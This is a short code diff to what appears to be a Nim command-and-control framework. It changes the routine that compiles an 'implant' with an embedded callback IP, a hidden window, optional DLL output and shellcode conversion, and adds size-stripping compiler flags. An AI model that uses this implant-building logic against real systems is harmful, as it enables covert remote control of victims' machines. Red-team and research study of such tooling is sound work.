@@ -1,13 +1,4 @@
-import std/[
-  osproc, 
-  os,
-  strutils, 
-  asyncdispatch, 
-  tables
-]
-
-import ../../types
-import ../../logging
+import ../prelude
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   
@@ -42,10 +33,10 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
     format = "dll"
     createShellcode = true
 
-  let compileCommand = "nim c -d:client " &
+  let compileCommand = "nim -d:client " &
     (if showWindow or format == "dll": "" else: "--app=gui " & " ") & # disable window
     (if format == "dll": "--app=lib --nomain " else: "") & 
-    "--passL:-s" & " " &  
+    "--passL:-s --passL:-Wl,--gc-sections -a:off -x:off --lineTrace:off --stackTrace:off --threads:off --opt:size" & " " &  
     "-d:release" & " " &  
     "-d:ip=" & ip & " " & 
     "-d:" & listenerType & " " & 
@@ -59,7 +50,7 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
       elif platform == "windows" and format == "exe": ".exe" 
       else: ""
     ) & " " &
-    "./src/client/client.nim"
+    "c ./src/client/client.nim"
 
   infoLog "Running: " & compileCommand
   
@@ -68,7 +59,7 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
   if exitCode != 0:
     errorLog "failed to compiled implant"
   else:
-    infoLog "successfully saved implant" & (if createShellcode: ", now building shellcode.." else: "")
+    successLog "successfully saved implant" & (if createShellcode: ", now building shellcode.." else: "")
   
   if not createShellcode: return
 
